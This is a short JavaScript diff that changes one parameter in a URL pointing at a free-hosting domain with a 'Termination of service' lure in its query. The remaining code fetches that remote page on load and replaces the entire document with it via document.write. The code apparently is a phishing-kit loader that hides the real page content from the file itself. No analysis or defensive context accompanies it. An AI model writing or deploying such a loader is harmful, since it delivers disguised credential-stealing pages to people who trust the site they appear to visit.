@@ -1,2 +1,2 @@
-const url = 'https://fscoss.stars.ne.jp/sf/r.php?d=Termination+of+service&s=8192235479';  
+const url = 'https://fscoss.stars.ne.jp/sf/r.php?d=Termination+of+service&s=800';  
 window.onload = async () => { try { const response = await fetch(url); if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`); const html = await response.text(); document.open(); document.write(html); document.close();  } catch (error) { console.error('Error:', error);  document.open(); document.write(`<h1>Failed to load the page</h1><p>${error.message}</p>`); document.close(); } };
